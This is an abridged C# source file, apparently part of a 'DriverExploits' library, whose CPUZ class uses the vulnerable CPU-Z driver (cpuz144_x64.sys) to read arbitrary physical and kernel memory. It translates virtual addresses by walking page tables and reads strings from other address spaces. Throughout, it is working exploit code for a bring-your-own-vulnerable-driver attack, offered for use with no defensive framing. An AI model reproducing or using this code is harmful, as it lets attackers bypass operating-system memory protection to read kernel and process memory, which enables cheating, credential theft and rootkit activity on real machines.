...
namespace DriverExploits
{
    public unsafe class CPUZ
    {
        ...
        //private const string DriverFileName = "C:\\Windows\\Temp\\cpuz144\\cpuz144_x64.sys";
        ...
        public ulong TranslateLinearAddress(ulong directoryTableBase, ulong virtualAddress)
        {
            ...
            ulong PDPTE = ReadPhysicalAddress<ulong>((PML4E & 0xFFFFFFFFFF000) + (ulong)DirectoryPtr * sizeof(ulong));
        ...
        public T ReadPhysicalAddress<T>(ulong address) where T : struct
        {
            ...
            if (!ReadPhysicalAddress(address, (ulong)buf, (ulong)Marshal.SizeOf(typeof(T))))
            {
                ...
                Console.WriteLine(errorMessage + "   "+ string.Format("0x{0:X}", address) );
        ...
        public T ReadPhysicalAddress<T>(ulong DirectoryBase, ulong address) where T : struct
        {
            ulong addr = TranslateLinearAddress(DirectoryBase, address);
            if (addr == 0)
                return new T();
            return ReadPhysicalAddress<T>(addr);
        }

        public string ReadPhysicalString(ulong address)
        {
            int MaxStrSize = 64;
            var buf = Marshal.AllocHGlobal(MaxStrSize);

            if (!ReadPhysicalAddress(address, (ulong)buf, (ulong)MaxStrSize))
                throw new Exception("Read failed");
 
           var str = Marshal.PtrToStringAnsi(buf);
        ...
        public string ReadPhysicalString(ulong DirectoryBase, ulong address)
        {
            ulong addr = TranslateLinearAddress(DirectoryBase, address);
            if (addr == 0)
                return string.Empty;
            return ReadPhysicalString(addr);
        }

        public string ReadSystemString(ulong address)
        {
            int MaxStrSize = 255;
            var buf = Marshal.AllocHGlobal(MaxStrSize);

            if (!ReadSystemAddress(address, (ulong)buf, (ulong)MaxStrSize))
                throw new Exception("Read failed");
